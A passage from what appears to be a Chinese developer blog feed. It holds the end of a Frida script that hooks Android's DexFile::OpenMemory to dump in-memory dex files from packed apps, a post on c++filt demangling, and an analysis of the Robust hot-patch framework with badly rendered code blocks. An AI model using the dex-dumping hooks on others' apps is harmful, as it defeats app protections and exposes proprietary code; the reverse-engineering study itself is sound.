大小</span><br><span class="line">        var dex_size = Memory.readInt(ptr(address))</span><br><span class="line"></span><br><span class="line">        console.log(&quot;dex_size :&quot; + dex_size)</span><br><span class="line">        //dump dex 到/data/data/pkg/目录下</span><br><span class="line">        var file = new File(&quot;/sdcard/unpack/&quot; + dex_size + &quot;.dex&quot;, &quot;wb&quot;)</span><br><span class="line">        file.write(Memory.readByteArray(begin, dex_size))</span><br><span class="line">        file.flush()</span><br><span class="line">        file.close()</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: function (retval) &#123;</span><br><span class="line">        if (retval.toInt32() &gt; 0) &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//64位的libart.so </span><br><span class="line">var openmemory = Module.findExportByName(&quot;libart.so&quot;,&quot;_ZN3art7DexFile10OpenMemoryEPKhmRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;);</span><br><span class="line">console.log(&quot;openmemory addr: &quot;+openmemory);</span><br><span class="line">Interceptor.attach(openmemory, &#123;</span><br><span class="line">    onEnter: function (args) &#123;</span><br><span class="line">      </span><br><span class="line">        //dex起始位置</span><br><span class="line">        //64位这里获取的args[1]有bug,这里直接读取r0寄存器</span><br><span class="line">        var begin = this.context.x0</span><br><span class="line">        //console.log(this.context.x0);</span><br><span class="line">        //打印magic</span><br><span class="line">        console.log(&quot;magic : &quot; + Memory.readUtf8String(begin))</span><br><span class="line">        //dex fileSize 地址</span><br><span class="line">        var address = parseInt(begin,16) + 0x20</span><br><span class="line">        //dex 大小</span><br><span class="line">        var dex_size = Memory.readInt(ptr(address))</span><br><span class="line"></span><br><span class="line">        console.log(&quot;dex_size :&quot; + dex_size)</span><br><span class="line">        //dump dex 到/data/data/pkg/目录下</span><br><span class="line">        var file = new File(&quot;/sdcard/unpack/&quot; + dex_size + &quot;.dex&quot;, &quot;wb&quot;)</span><br><span class="line">        file.write(Memory.readByteArray(begin, dex_size))</span><br><span class="line">        file.flush()</span><br><span class="line">        file.close()</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: function (retval) &#123;</span><br><span class="line">        if (retval.toInt32() &gt; 0) &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><ol><li><p>dump出来的dex可能为非app本身的dex,如：</p><ul><li>系统自身注入的dex，如一些性能统计的dex，我的oneplus手机中出现了com.qualcomm.qti</li><li>所有的xposed插件（xposed是注入的zygote，因此所有插件都会注入到app进程,所以谨慎使用xposed插件，一个恶意插件可以获得所有的app进程内数据）</li><li><p>Inspeckage也是基于xposed,属于它的一个插件</p><p>这些工具都会注入到app进程，导致拖出来多余的dex。</p></li></ul></li><li>frida插件是以dex文件的大小来命名的，当两个dex文件大小相同时，会覆盖dump出来的dex</li></ol><p>参考资料：</p><ol><li><a href="https://bbs.pediy.com/thread-217864.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-217864.htm</a></li><li><a href="https://github.com/dstmath/frida-unpack" target="_blank" rel="noopener">https://github.com/dstmath/frida-unpack</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>c++filt - 还原so中的函数名</title>
      <link href="/2018/08/22/c-filt/"/>
      <url>/2018/08/22/c-filt/</url>
      
        <content type="html"><![CDATA[<h2 id="C-的name-mangling"><a href="#C-的name-mangling" class="headerlink" title="C++的name mangling"></a>C++的name mangling</h2><p>C++是允许函数重载的，也就引出了编译器的name mangling（名字修饰）机制,其目的是给同名的重载函数不同的签名。</p><p>例如，对于如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int test(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">  return a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int test(int a)&#123;</span><br><span class="line"> return a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用g++编译成so后，使用nm -a (ldd -r命令也可以)查看so中的符号：</p><p><img src="/images/pasted-124.png" alt="upload successful"></p><p>发现两个test函数名字变为<strong>Z4testi和</strong>Z4testii, 这就是name mangling机制产生的。其中_Z是一个前缀，4表示函数名长度（test长度为4），i表示参数类型。</p><p>C++的name mangling遵循一定的规则，因此是可逆的，即通过符号还原出原来的函数定义。这个工具就叫c++filt。</p><h2 id="c-filt"><a href="#c-filt" class="headerlink" title="c++filt"></a>c++filt</h2><p>对于上述例子中的符号我们使用c++filt</p><p><img src="/images/pasted-125.png" alt="upload successful"></p><p>可以看到还原出来我们定义的函数。</p><p>当然，工程中的函数并没有我们给出的例子中那么简单，例如Android中有那么多的类和命名空间，其编译生成的符号也是很复杂的，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$c++filt __ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_</span><br><span class="line">输出：</span><br><span class="line">art::DexFile::OpenMemory(unsigned char const*, unsigned int, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, unsigned int, art::MemMap*, art::OatDexFile const*, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt;*)</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>c++filt在hook、逆向等场景中非常有用，可以帮助我们很快的还原符号，定位代码。</p><p>参考资料：</p><ol><li><a href="https://en.wikipedia.org/wiki/Name_mangling" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Name_mangling</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Robust热修复框架原理分析</title>
      <link href="/2018/08/21/Robust/"/>
      <url>/2018/08/21/Robust/</url>
      
        <content type="html"><![CDATA[<h2 id="关于Robust"><a href="#关于Robust" class="headerlink" title="关于Robust"></a>关于Robust</h2><p>Robust（<a href="https://github.com/Meituan-Dianping/Robust/blob/master/README-zh.md）是美团推出的一个热补丁框架，可兼容Android2.3-8.0版本，据称补丁修补成功率高达99.9%。" target="_blank" rel="noopener">https://github.com/Meituan-Dianping/Robust/blob/master/README-zh.md）是美团推出的一个热补丁框架，可兼容Android2.3-8.0版本，据称补丁修补成功率高达99.9%。</a></p><h2 id="Robust使用"><a href="#Robust使用" class="headerlink" title="Robust使用"></a>Robust使用</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><ol><li><p>在App的build.gradle，加入如下依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: &apos;com.android.application&apos;</span><br><span class="line">//制作补丁时将这个打开，auto-patch-plugin紧跟着com.android.application</span><br><span class="line">//apply plugin: &apos;auto-patch-plugin&apos;</span><br><span class="line">apply plugin: &apos;robust&apos;</span><br><span class="line">compile &apos;com.meituan.robust:robust:0.4.82&apos;</span><br></pre></td></tr></table></figure></li><li><p>在整个项目的build.gradle加入classpath</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">         classpath &apos;com.meituan.robust:gradle-plugin:0.4.82&apos;</span><br><span class="line">         classpath &apos;com.meituan.robust:auto-patch-plugin:0.4.82&apos;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在项目的src同级目录下配置robust.xml文件，具体项请参考DEMOapp/robust.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;resources&gt;</span><br><span class="line"></span><br><span class="line">    &lt;switch&gt;</span><br><span class="line">        &lt;!--true代表打开Robust，请注意即使这个值为true，Robust也默认只在Release模式下开启--&gt;</span><br><span class="line">        &lt;!--false代表关闭Robust，无论是Debug还是Release模式都不会运行robust--&gt;</span><br><span class="line">        &lt;turnOnRobust&gt;true&lt;/turnOnRobust&gt;</span><br><span class="line">        &lt;!--&lt;turnOnRobust&gt;false&lt;/turnOnRobust&gt;--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--是否开启手动模式，手动模式会去寻找配置项patchPackname包名下的所有类，自动的处理混淆，然后把patchPackname包名下的所有类制作成补丁--&gt;</span><br><span class="line">        &lt;!--这个开关只是把配置项patchPackname包名下的所有类制作成补丁，适用于特殊情况，一般不会遇到--&gt;</span><br><span class="line">        &lt;!--&lt;manual&gt;true&lt;/manual&gt;--&gt;</span><br><span class="line">        &lt;manual&gt;false&lt;/manual&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--是否强制插入插入代码，Robust默认在debug模式下是关闭的，开启这个选项为true会在debug下插入代码--&gt;</span><br><span class="line">        &lt;!--但是当配置项turnOnRobust是false时，这个配置项不会生效--&gt;</span><br><span class="line">        &lt;!--&lt;forceInsert&gt;true&lt;/forceInsert&gt;--&gt;</span><br><span class="line">        &lt;forceInsert&gt;false&lt;/forceInsert&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--是否捕获补丁中所有异常，建议上线的时候这个开关的值为true，测试的时候为false--&gt;</span><br><span class="line">        &lt;catchReflectException&gt;true&lt;/catchReflectException&gt;</span><br><span class="line">        &lt;!--&lt;catchReflectException&gt;false&lt;/catchReflectException&gt;--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--是否在补丁加上log，建议上线的时候这个开关的值为false，测试的时候为true--&gt;</span><br><span class="line">        &lt;!--&lt;patchLog&gt;true&lt;/patchLog&gt;--&gt;</span><br><span class="line">        &lt;patchLog&gt;false&lt;/patchLog&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--项目是否支持progaurd--&gt;</span><br><span class="line">        &lt;proguard&gt;true&lt;/proguard&gt;</span><br><span class="line">        &lt;!--&lt;proguard&gt;false&lt;/proguard&gt;--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--项目是否支持ASM进行插桩，默认使用ASM，推荐使用ASM，Javaassist在容易和其他字节码工具相互干扰--&gt;</span><br><span class="line">        &lt;useAsm&gt;true&lt;/useAsm&gt;</span><br><span class="line">        &lt;!--&lt;useAsm&gt;false&lt;/useAsm&gt;--&gt;</span><br><span class="line">    &lt;/switch&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--需要热补的包名或者类名，这些包名下的所有类都被会插入代码--&gt;</span><br><span class="line">    &lt;!--这个配置项是各个APP需要自行配置，就是你们App里面你们自己代码的包名，</span><br><span class="line">    这些包名下的类会被Robust插入代码，没有被Robust插入代码的类Robust是无法修复的--&gt;</span><br><span class="line">    &lt;packname name=&quot;hotfixPackage&quot;&gt;</span><br><span class="line">        &lt;name&gt;com.meituan&lt;/name&gt;</span><br><span class="line">        &lt;name&gt;com.sankuai&lt;/name&gt;</span><br><span class="line">        &lt;name&gt;com.dianping&lt;/name&gt;</span><br><span class="line">    &lt;/packname&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--不需要Robust插入代码的包名，Robust库不需要插入代码，如下的配置项请保留，还可以根据各个APP的情况执行添加--&gt;</span><br><span class="line">    &lt;exceptPackname name=&quot;exceptPackage&quot;&gt;</span><br><span class="line">        &lt;name&gt;com.meituan.robust&lt;/name&gt;</span><br><span class="line">        &lt;name&gt;com.meituan.sample.extension&lt;/name&gt;</span><br><span class="line">    &lt;/exceptPackname&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--补丁的包名，请保持和类PatchManipulateImp中fetchPatchList方法中设置的补丁类名保持一致（ setPatchesInfoImplClassFullName(&quot;com.meituan.robust.patch.PatchesInfoImpl&quot;)），</span><br><span class="line">    各个App可以独立定制，需要确保的是setPatchesInfoImplClassFullName设置的包名是如下的配置项，类名必须是：PatchesInfoImpl--&gt;</span><br><span class="line">    &lt;patchPackname name=&quot;patchPackname&quot;&gt;</span><br><span class="line">        &lt;name&gt;com.meituan.robust.patch&lt;/name&gt;</span><br><span class="line">    &lt;/patchPackname&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--自动化补丁中，不需要反射处理的类，这个配置项慎重选择--&gt;</span><br><span class="line">    &lt;noNeedReflectClass name=&quot;classes no need to reflect&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/noNeedReflectClass&gt;</span><br><span class="line">&lt;/resources&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="自动生成补丁"><a href="#自动生成补丁" class="headerlink" title="自动生成补丁"></a>自动生成补丁</h3><ol><li><p>使用插件时，需要把auto-patch-plugin放置在com.android.application插件之后，其余插件之前。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: &apos;com.android.application&apos;</span><br><span class="line">apply plugin: &apos;auto-patch-plugin&apos;</span><br></pre></td></tr></table></figure></li><li><p>将保存下来的mapping文件和methodsMap.robust文件放在app/robust/文件夹下。</p></li><li><p>修改代码，在改动的方法上面添加@Modify注解,对于Lambda表达式请在修改的方法里面调用RobustModify.modify()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   @Modify</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">     &#125;</span><br><span class="line">     //或者是被修改的方法里面调用RobustModify.modify()方法</span><br><span class="line">     protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        RobustModify.modify()</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">     &#125;</span><br><span class="line">```     </span><br><span class="line">新增的方法和字段使用@Add注解</span><br></pre></td></tr></table></figure><p> //增加方法<br> @Add<br> public String getString() {</p><pre><code>return &quot;Robust&quot;;</code></pre><p> }<br> //增加类<br> @Add<br> public class NewAddCLass {</p><pre><code>public static String get() {   return &quot;robust&quot;; }</code></pre><p> }</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4. 运行和生成线上apk同样的命令，即可生成补丁，补丁目录app/build/outputs/robust/patch.jar</span><br></pre></td></tr></table></figure></li></ol><p>./gradlew clean  assembleRelease –stacktrace –no-daemon<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">5. 补丁制作成功后会停止构建apk，出现类似于如下的提示，表示补丁生成成功 </span><br><span class="line"></span><br><span class="line">![upload successful](/images/pasted-115.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Robust实现原理</span><br><span class="line"></span><br><span class="line">Robust热修复框架的大概原理为：用DexClassLoader加载修复包，然后用loadClass方法加载修复类，new出新对象，再把这新的修复对象设置到指定类的changeQuickRedirect静态变量中即可。</span><br><span class="line"></span><br><span class="line">官方给出的流程图如下：</span><br><span class="line"></span><br><span class="line">![upload successful](/images/pasted-123.png)</span><br><span class="line"></span><br><span class="line">下文中我们将分编译阶段、补丁结构、补丁生效和补丁执行4个阶段来介绍Robust实现原理。</span><br><span class="line"></span><br><span class="line">### 编译阶段</span><br><span class="line">Robust将apk代码中每个函数都在编译打包阶段自动的插入一段代码:</span><br></pre></td></tr></table></figure></p><p>//原函数<br>public long getIndex() {<br>        return 100;<br>    }</p><p>//使用Robust插件编译后<br>public static ChangeQuickRedirect changeQuickRedirect;<br>    public long getIndex() {<br>        if(changeQuickRedirect != null) {<br>            if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) {<br>                return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue();<br>            }<br>        }<br>        return 100L;<br>    }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看到Robust为每个class增加了个类型为ChangeQuickRedirect的静态成员，而在每个方法前都插入了使用changeQuickRedirect相关的逻辑，当changeQuickRedirect不为null时，会执行到accessDispatch方法从而替换掉之前老的逻辑，达到修复的目的。</span><br><span class="line"></span><br><span class="line">### 补丁结构</span><br><span class="line">Robust会根据@Modify、@Add等注解搜集所有要修改的函数，并将修复后的文件打包成dex或jar。</span><br><span class="line"></span><br><span class="line">补丁文件主要包含：PatchesInfoImpl.java，xxxPatchControl.java，xxxPatch.java(其中xxx为原类的名字)，如下图：</span><br><span class="line">PatchesInfoImpl只有一个，补丁修改了3个类，因此有3对Patch和PatchControl类</span><br><span class="line"></span><br><span class="line">![upload successful](/images/pasted-118.png)</span><br><span class="line"></span><br><span class="line">其中</span><br><span class="line">- PatchesInfoImpl.java中定义了修复前后class的对应关系：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![upload successful](/images/pasted-119.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 每个xxxPatchControl.java中都存在以下静态成员变量和方法：</span><br></pre></td></tr></table></figure></p><p>public class xxxPatchControl implements ChangeQuickRedirect<br>{</p><pre><code>public static final String MATCH_ALL_PARAMETER = &quot;(\\w*\\.)*\\w*&quot;;private static final Map&lt;Object, Object&gt; keyToValueRelation = new WeakHashMap();//获取函数的参数的方法public Object getRealParameter(Object obj){..具体逻辑..}//判断是否支持修复public boolean isSupport(String methodName, Object[] paramArrayOfObject){..具体逻辑.}//执行到accessDispatch方法替换旧的类方法public Object accessDispatch(String methodName, Object[] paramArrayOfObject) {.具体逻辑..}}//解决boolean被优化成byte的问题private static Object fixObj(Object booleanObj) {.具体逻辑..}</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- xxxPatch.java中是修改后函数的具体实现，例如下图中修改了getTextInfo()方法的返回值</span><br><span class="line"></span><br><span class="line">![upload successful](/images/pasted-120.png)</span><br><span class="line"></span><br><span class="line">### 补丁生效</span><br><span class="line">补丁生效通常在App启动时调用</span><br></pre></td></tr></table></figure></p><p>new PatchExecutor(getApplicationContext(), new PatchManipulateImp(), new RobustCallBackSample()).start();<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PatchExecutor继承Thread类，启动后会调用fetchPatchList()函数拉取补丁，调用applyPatchList()使补丁生效。其具体实现如下：</span><br></pre></td></tr></table></figure></p><p>//可以看到PatchExecutor继承线程类Thread<br>public class PatchExecutor extends Thread {<br>    protected Context context;<br>    protected PatchManipulate patchManipulate;<br>    protected RobustCallBack robustCallBack;<br>    //构造函数<br>    public PatchExecutor(Context context, PatchManipulate patchManipulate, RobustCallBack robustCallBack) {<br>        this.context = context.getApplicationContext();<br>        this.patchManipulate = patchManipulate;<br>        this.robustCallBack = robustCallBack;<br>    }<br>    public void run() {<br>        try {<br>            //拉取补丁列表<br>            List<patch> patches = fetchPatchList();<br>            //应用补丁列表<br>            applyPatchList(patches);<br>        } catch (Throwable t) {<br>            Log.e(“robust”, “PatchExecutor run”, t);<br>            robustCallBack.exceptionNotify(t, “class:PatchExecutor,method:run,line:36”);<br>        }<br>    }<br>    …<br>    }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 获取补丁</span><br><span class="line">fetchPatchList最终调用PatchManipulateImp类的fetchPatchList方法</span><br></pre></td></tr></table></figure></patch></p><pre><code>protected List&lt;Patch&gt; fetchPatchList(Context context) {    //将app自己的robustApkHash上报给服务端，服务端根据robustApkHash来区分每一次apk build来给app下发补丁    //apkhash is the unique identifier for  apk,so you cannnot patch wrong apk.    String robustApkHash = RobustApkHashUtils.readRobustApkHash(context);    Log.w(&quot;robust&quot;,&quot;robustApkHash :&quot; + robustApkHash);    //在这里去联网获取补丁列表    Patch patch = new Patch();    patch.setName(&quot;123&quot;);    //LocalPath是存储原始的补丁文件，这个文件应该是加密过的，TempPath是加密之后的，TempPath下的补丁加载完毕就删除，保证安全性    //这里面需要设置一些补丁的信息，主要是联网的获取的补丁信息。重要的如MD5，进行原始补丁文件的简单校验，以及补丁存储的位置，这边推荐把补丁的储存位置放置到应用的私有目录下，保证安全性    patch.setLocalPath(Environment.getExternalStorageDirectory().getPath()+ File.separator+&quot;robust&quot;+File.separator + &quot;patch&quot;);    //setPatchesInfoImplClassFullName 设置项各个App可以独立定制，需要确保的是setPatchesInfoImplClassFullName设置的包名是和xml配置项patchPackname保持一致，而且类名必须是：PatchesInfoImpl    //请注意这里的设置    patch.setPatchesInfoImplClassFullName(&quot;com.meituan.robust.patch.PatchesInfoImpl&quot;);    List  patches = new ArrayList&lt;Patch&gt;();    patches.add(patch);    return patches;}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 应用补丁</span><br><span class="line">applyPatchList的实现如下:</span><br></pre></td></tr></table></figure><p>protected void applyPatchList(List<patch> patches) {</patch></p><pre><code>for (Patch p : patches) {    if (p.isAppliedSuccess()) {        Log.d(&quot;robust&quot;, &quot;p.isAppliedSuccess() skip &quot; + p.getLocalPath());        continue;    }    if (patchManipulate.ensurePatchExist(p)) {        boolean currentPatchResult = false;        try {        //真正应用补丁的方法patch()            currentPatchResult = patch(context, p);        } catch (Throwable t) {            robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:applyPatchList line:69&quot;);        }        if (currentPatchResult) {            //设置patch 状态为成功            p.setAppliedSuccess(true);            //统计PATCH成功率 PATCH成功            robustCallBack.onPatchApplied(true, p);        } else {            //统计PATCH成功率 PATCH失败            robustCallBack.onPatchApplied(false, p);        }        Log.d(&quot;robust&quot;, &quot;patch LocalPath:&quot; + p.getLocalPath() + &quot;,apply result &quot; + currentPatchResult);    }}</code></pre><p>   }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">跟踪patch()函数的实现：</span><br></pre></td></tr></table></figure></p><p>protected boolean patch(Context context, Patch patch) {<br>    //验证patch的hash<br>        if (!patchManipulate.verifyPatch(context, patch)) {<br>            return false;<br>        }<br>    //调用DexClassLoader动态加载dex<br>        DexClassLoader classLoader = new DexClassLoader(patch.getTempPath(), context.getCacheDir().getAbsolutePath(),null, PatchExecutor.class.getClassLoader());<br>        patch.delete(patch.getTempPath());</p><pre><code>    Class patchClass, oldClass;    Class patchsInfoClass;    PatchesInfo patchesInfo = null;//动态加载PatchesInfoImpl，获取要patch的类,之前介绍过PatchesInfoImpl.java中保存了所有要patch的类以及映射    try {        patchsInfoClass = classLoader.loadClass(patch.getPatchesInfoImplClassFullName());        patchesInfo = (PatchesInfo) patchsInfoClass.newInstance();    } catch (Throwable t) {        Log.e(&quot;robust&quot;, &quot;PatchsInfoImpl failed,cause of&quot; + t.toString());        t.printStackTrace();    }//调用PatchesInfoImpl的getPatchedClassesInfo，返回一个List    List&lt;PatchedClassInfo&gt; patchedClasses = patchesInfo.getPatchedClassesInfo();//循环类名，将patchedClasses中的类打补丁    for (PatchedClassInfo patchedClassInfo : patchedClasses) {        String patchedClassName = patchedClassInfo.patchedClassName;//修改前的类名,即oldclass        String patchClassName = patchedClassInfo.patchClassName;//修改后的类名Control//将oldClass的changeQuickRedirectField的值设置为patchObject的实例。        try {            oldClass = classLoader.loadClass(patchedClassName.trim());            Field[] fields = oldClass.getDeclaredFields();            //遍历Fields找到changeQuickRedirect            Field changeQuickRedirectField = null;            for (Field field : fields) {                if (TextUtils.equals(field.getType().getCanonicalName(), ChangeQuickRedirect.class.getCanonicalName()) &amp;&amp; TextUtils.equals(field.getDeclaringClass().getCanonicalName(), oldClass.getCanonicalName())) {                    changeQuickRedirectField = field;                    break;                }            }            try {         //加载补丁类                patchClass = classLoader.loadClass(patchClassName);                Object patchObject = patchClass.newInstance();                changeQuickRedirectField.setAccessible(true);         //将原类的changeQuickRedirectField设置为patchObject实例，即补丁类                changeQuickRedirectField.set(null, patchObject);            } catch (Throwable t) {                Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);            }        } catch (Throwable t) {            Log.e(&quot;robust&quot;, &quot;patch failed! &quot;);        }    }    Log.d(&quot;robust&quot;, &quot;patch finished &quot;);    return true;}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">上述代码去掉了部分log信息，对关键的处理已经标注了注释，不难看出patch通过classLoader加载了原类和补丁Control类，并遍历原类中的Field找到changeQuickRedirect，将其赋值为一个补丁类的对象。（由于补丁Control类实现了changeQuickRedirect接口，因此可以直接赋值）。</span><br><span class="line"></span><br><span class="line">由于在编译阶段生成的代码中，如果原类的changeQuickRedirect值不为空，就执行补丁逻辑，所以经过这部分代码后，原类的changeQuickRedirect变成一个补丁类的对象。</span><br><span class="line"></span><br><span class="line">### 调用补丁</span><br><span class="line"></span><br><span class="line">由编译阶段可知补丁的调用代码为：</span><br></pre></td></tr></table></figure><pre><code>if(changeQuickRedirect != null) {    if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) {        return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue();    }}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们看看源码中的PatchProxy中的isSupport()的实现：</span><br></pre></td></tr></table></figure><p>public static boolean isSupport(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) {<br>        //获取 classMethod = className + “:” + methodName + “:” + isStatic + “:” + methodNumber;<br>        String classMethod = getClassMethod(isStatic, methodNumber);</p><pre><code>    Object[] objects = getObjects(paramsArray, current, isStatic);    try {    //调用changeQuickRedirect.isSupport        return changeQuickRedirect.isSupport(classMethod, objects);    } catch (Throwable t) {        return false;    }}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 